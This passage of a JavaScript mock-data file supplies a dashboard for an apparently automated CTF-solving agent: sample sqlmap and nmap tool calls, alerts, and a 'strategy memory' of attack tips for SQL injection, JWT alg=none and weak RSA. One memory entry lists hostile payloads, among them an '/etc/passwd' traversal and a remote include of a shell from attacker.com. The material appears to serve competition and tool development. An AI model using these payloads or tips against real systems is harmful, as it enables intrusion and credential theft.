    { t: '14:00', v: 7 }, { t: '15:00', v: 4 }, { t: '16:00', v: 2 },
    { t: '17:00', v: 1 }, { t: '18:00', v: 1 },
  ],
  recentTasks: TASKS.slice(0, 6),
  recentToolCalls: [
    { id: 'tc1', time: nowOffset(-12),  tool: 'terminal',     summary: 'sqlmap enumerate users', status: 'running',  runId: 'run_002' },
    { id: 'tc2', time: nowOffset(-92),  tool: 'terminal',     summary: 'sqlmap --dbms=postgresql', status: 'running',  runId: 'run_002' },
    { id: 'tc3', time: nowOffset(-210), tool: 'http_request', summary: '6 probe payloads',         status: 'success',  runId: 'run_002' },
    { id: 'tc4', time: nowOffset(-250), tool: 'terminal',     summary: 'nmap -sV',                  status: 'success',  runId: 'run_002' },
    { id: 'tc5', time: nowOffset(-2030),tool: 'terminal',     summary: 'sqlite3 .recover',          status: 'success',  runId: 'run_001' },
    { id: 'tc6', time: nowOffset(-2034),tool: 'terminal',     summary: 'wget app.db app.db-wal',    status: 'success',  runId: 'run_001' },
    { id: 'tc7', time: nowOffset(-3210),tool: 'http_request', summary: 'jwt alg=none probe',        status: 'failed',   runId: 'run_003' },
    { id: 'tc8', time: nowOffset(-5400),tool: 'python_eval',  summary: 'lsb extract glitch_card.png', status: 'success', runId: 'run_004' },
  ],
  recentNotes: [
    { id: 'nt1', t: nowOffset(-18),  text: 'sleep delta confirmed @ payload offset 6', tag: 'observation', run: 'run_002' },
    { id: 'nt2', t: nowOffset(-148), text: 'target_db = postgres (user hint)',          tag: 'fact',        run: 'run_002' },
    { id: 'nt3', t: nowOffset(-198), text: 'response_size_anomaly: 142 → 318',          tag: 'observation', run: 'run_002' },
    { id: 'nt4', t: nowOffset(-2029),text: 'flag visible in WAL frames pre-checkpoint', tag: 'forensics',   run: 'run_001' },
  ],
  recentArtifacts: [
    { id: 'ar1', t: nowOffset(-90),   name: 'sqlmap_session/',  kind: 'directory', run: 'run_002' },
    { id: 'ar2', t: nowOffset(-242),  name: 'nmap_sv.xml',      kind: 'file',      run: 'run_002' },
    { id: 'ar3', t: nowOffset(-2032), name: 'app.db-wal',       kind: 'file',      run: 'run_001' },
    { id: 'ar4', t: nowOffset(-5278), name: 'extracted_lsb.txt',kind: 'file',      run: 'run_004' },
  ],
  alerts: [
    { id: 'al1', level: 'warn', text: 'run_002 已运行 4m 18s · 仍在 exploit 阶段', t: nowOffset(-2) },
    { id: 'al2', level: 'info', text: 'daily token usage 36% of cap (184k / 500k)', t: nowOffset(-30) },
    { id: 'al3', level: 'info', text: 'knowledge index 已 24h 未更新', t: nowOffset(-3600) },
  ],
};

// ------------------------------------------------------------
// Notifications panel data
// ------------------------------------------------------------
const NOTIFICATIONS = [
  { id: 'nf1', level: 'success', ttl: 'flag verified · flag{wal_recovery_works_2026}', sub: 'task_001 · run_001', t: nowOffset(-2028) },
  { id: 'nf2', level: 'warn',    ttl: 'run_002 仍在 exploit 阶段',                       sub: '4m 18s · sqlmap pid=18472', t: nowOffset(-2) },
  { id: 'nf3', level: 'info',    ttl: '用户 hint 已注入 run_002',                        sub: '"注意 backend 是 postgres"',  t: nowOffset(-150) },
  { id: 'nf4', level: 'err',     ttl: 'run_003 failed · stop_reason=no_progress',       sub: 'JWT alg=none rejected · 401',   t: nowOffset(-3120) },
  { id: 'nf5', level: 'info',    ttl: 'knowledge index 已 24h 未更新',                  sub: 'consider refreshing',           t: nowOffset(-3600) },
];

// ------------------------------------------------------------
// Live event simulation — drives ticker + dashboard recent ev
// ------------------------------------------------------------
const SIM_EVENTS_POOL = [
  { who: 'run_002', what: 'sqlmap · enumerating column password_hash', kind: 'tool' },
  { who: 'run_002', what: 'observed timing delta Δ=4.18s @ offset 7',  kind: 'note' },
  { who: 'run_002', what: 'fetching row 13 of pg_user',                kind: 'tool' },
  { who: 'run_002', what: 'observation feed updated (+1)',             kind: 'system' },
  { who: 'token_tracker', what: '+220 tokens · cumulative 18,640',     kind: 'system' },
  { who: 'run_002', what: 'sqlmap heuristic suggests CHAR-based payload', kind: 'tool' },
  { who: 'run_002', what: 'fetching row 14 of pg_user',                kind: 'tool' },
  { who: 'rag',     what: 'cache hit · postgres timing primitives',    kind: 'knowledge' },
  { who: 'run_002', what: 'sleep delta confirmed Δ=4.21s',             kind: 'note' },
  { who: 'verifier',what: 'candidate not yet found · continuing',      kind: 'system' },
];

function makeSimulator() {
  let ticks = [];
  let listeners = new Set();
  let i = 0;
  function broadcast() { listeners.forEach(l => l([...ticks])); }
  setInterval(() => {
    const tpl = SIM_EVENTS_POOL[i % SIM_EVENTS_POOL.length];
    i++;
    const tick = {
      id: `tk_${Date.now()}`,
      t: new Date().toISOString(),
      ...tpl,
    };
    ticks.unshift(tick);
    if (ticks.length > 14) ticks = ticks.slice(0, 14);
    broadcast();
  }, 3600);
  // seed
  ticks = [
    { id: 't0', t: nowOffset(-2),  who: 'run_002', what: 'sqlmap enumerating users (row 12)', kind: 'tool' },
    { id: 't1', t: nowOffset(-18), who: 'run_002', what: 'sleep delta confirmed Δ=4.2s',     kind: 'note' },
    { id: 't2', t: nowOffset(-92), who: 'run_002', what: 'sqlmap started · pid=18472',       kind: 'tool' },
  ];
  return {
    subscribe(fn) { listeners.add(fn); fn([...ticks]); return () => listeners.delete(fn); },
  };
}
window.LiveTicker = makeSimulator();

// ------------------------------------------------------------
// Export all
// ------------------------------------------------------------
// ------------------------------------------------------------
// STRATEGY MEMORY
// ------------------------------------------------------------
const MEMORY = [
  {
    id: 'mem_2405a1',
    fingerprint: { detected_type: 'web', tech_stack: ['Flask', 'SQLite'], auth_mechanism: 'session_cookie' },
    atomic_facts: ['login form at /login', 'SQLite backend confirmed', 'admin table has password column', 'error messages leak column names'],
    winning_hypothesis_kinds: ['sqli_union', 'sqli_blind_time'],
    winning_primitive_sequence: ['enum_forms', 'sqli_probe', 'dump_schema', 'dump_creds', 'login_as_admin'],
    avg_turns_to_flag: 8,
    failed_hypothesis_kinds: ['xss_reflected', 'path_traversal'],
    red_herrings_encountered: ['robots.txt admin path was a decoy'],
    learned_rules: ["Always probe login with single-quote first", "When error-based fails, switch to time-based blind", "Check INFORMATION_SCHEMA after first successful injection"],
    challenge_url: 'http://chall.ctf.example:8080',
    solved: true,
    created_at: NOW_BASE / 1000 - 86400 * 5,
    metadata: { applied_count: 7, successful_applications: 6, failed_applications: 1, success_correlation: 0.857, manual_status: 'active', confidence_decay_factor: 1.0 },
    failed_payloads: [], failure_reasons: [],
  },
  {
    id: 'mem_2405b2',
    fingerprint: { detected_type: 'web', tech_stack: ['Express', 'React'], auth_mechanism: 'jwt' },
    atomic_facts: ['JWT stored in localStorage', 'alg header not validated', 'admin endpoint at /api/admin'],
    winning_hypothesis_kinds: ['jwt_alg_none', 'jwt_weak_secret'],
    winning_primitive_sequence: ['decode_jwt', 'modify_alg_none', 'forge_admin_token', 'access_admin'],
    avg_turns_to_flag: 5,
    failed_hypothesis_kinds: ['sqli_union', 'xss_stored'],
    red_herrings_encountered: [],
    learned_rules: ["Check JWT alg header first on Express apps", "Try alg=none before brute-forcing secret", "localStorage JWT often means alg confusion is possible"],
    challenge_url: 'http://jwt-chall.ctf.example:3000',
    solved: true,
    created_at: NOW_BASE / 1000 - 86400 * 3,
    metadata: { applied_count: 4, successful_applications: 3, failed_applications: 1, success_correlation: 0.75, manual_status: 'active', confidence_decay_factor: 1.0 },
    failed_payloads: [], failure_reasons: [],
  },
  {
    id: 'mem_2405c3',
    fingerprint: { detected_type: 'crypto', tech_stack: ['Python', 'PyCryptodome'], auth_mechanism: null },
    atomic_facts: ['RSA 512-bit key', 'same n used twice', 'public exponent e=3'],
    winning_hypothesis_kinds: ['rsa_small_e', 'rsa_common_modulus'],
    winning_primitive_sequence: ['factor_n', 'compute_phi', 'compute_d', 'decrypt'],
    avg_turns_to_flag: 4,
    failed_hypothesis_kinds: ['rsa_lsb_oracle', 'padding_oracle'],
    red_herrings_encountered: ['encrypted message looked base64 but was hex'],
    learned_rules: ["Small e=3 with no padding: try cube root directly", "Always check if n is reused across challenges", "FactorDB first before running GNFS"],
    challenge_url: null,
    solved: true,
    created_at: NOW_BASE / 1000 - 86400 * 8,
    metadata: { applied_count: 5, successful_applications: 5, failed_applications: 0, success_correlation: 1.0, manual_status: 'active', confidence_decay_factor: 0.95 },
    failed_payloads: [], failure_reasons: [],
  },
  {
    id: 'mem_2405d4',
    fingerprint: { detected_type: 'web', tech_stack: ['PHP', 'Apache'], auth_mechanism: 'http_basic' },
    atomic_facts: ['PHP app', 'file inclusion parameter', 'Apache with mod_rewrite'],
    winning_hypothesis_kinds: [],
    winning_primitive_sequence: [],
    avg_turns_to_flag: 0,
    failed_hypothesis_kinds: ['lfi_etc_passwd', 'lfi_log_poisoning', 'rfi_external'],
    red_herrings_encountered: ['?page= param looked like LFI but was sanitized'],
    learned_rules: [],
    challenge_url: 'http://lfi-chall.ctf.example:8081',
    solved: false,
    created_at: NOW_BASE / 1000 - 86400 * 2,
    metadata: { applied_count: 3, successful_applications: 0, failed_applications: 3, success_correlation: 0.0, manual_status: 'muted', confidence_decay_factor: 0.7 },
    failed_payloads: ['../../../etc/passwd', 'php://filter/read=...', 'http://attacker.com/shell.txt'],
    failure_reasons: ['Input sanitized by realpath()', 'Log file not writable', 'allow_url_include=Off'],
  },
  {
    id: 'mem_2405e5',
    fingerprint: { detected_type: 'misc', tech_stack: ['Python', 'PIL'], auth_mechanism: null },
    atomic_facts: ['PNG image attachment', 'unusual LSB pattern in blue channel', 'metadata contains hint "look deeper"'],
    winning_hypothesis_kinds: ['stego_lsb_blue', 'stego_zsteg'],
    winning_primitive_sequence: ['run_zsteg', 'extract_lsb_b', 'decode_base64', 'get_flag'],
    avg_turns_to_flag: 3,
    failed_hypothesis_kinds: ['stego_lsb_red', 'exif_metadata', 'binwalk_extract'],
    red_herrings_encountered: [],
    learned_rules: ["Run zsteg -a first on PNG", "Blue channel LSB more common than red in recent CTFs", "Always check all 3 channels before giving up"],
    challenge_url: null,
    solved: true,
    created_at: NOW_BASE / 1000 - 86400 * 12,
    metadata: { applied_count: 2, successful_applications: 1, failed_applications: 1, success_correlation: 0.5, manual_status: 'deprecated', confidence_decay_factor: 0.6 },
    failed_payloads: [], failure_reasons: [],
  },
];

window.MOCK = {
  TASKS,
  TRACES,
  TIMELINE_002, TIMELINE_001,
  GRAPH_002,
  MESSAGES_002,
  TASK_002_PANEL,
  KNOWLEDGE,
  CHUNKS_002,
  LOGS,
  SETTINGS,
  DASHBOARD,
  NOTIFICATIONS,
  MEMORY,
};
